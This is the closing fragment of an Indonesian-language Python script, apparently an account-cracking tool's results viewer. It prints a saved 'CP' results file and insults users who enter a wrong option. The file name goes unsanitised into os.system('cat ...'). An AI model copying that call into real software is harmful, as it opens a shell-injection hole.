		jalan("%s•%s hasil tanggal%s : %s%s %stotal%s : %s%s"%(U,O,M,K,file_nm,O,M,K,len(totalcp)))
		print(" %s# %s---------------------------------------- %s#%s"%(P,M,P,K));jeda(2)
		os.system('cat CP/%s'%(file))
		print(" %s# %s---------------------------------------- %s#"%(P,M,P));jeda(2)
		exit('\n')
	elif l in['0','00']:
		Menu()
	else:
		print ("\n%sIsi yang benar %sGOBLOK's%s.....!!!"%(P,H,P))
		Menu()
		

if __name__=="__main__":
	Menu()
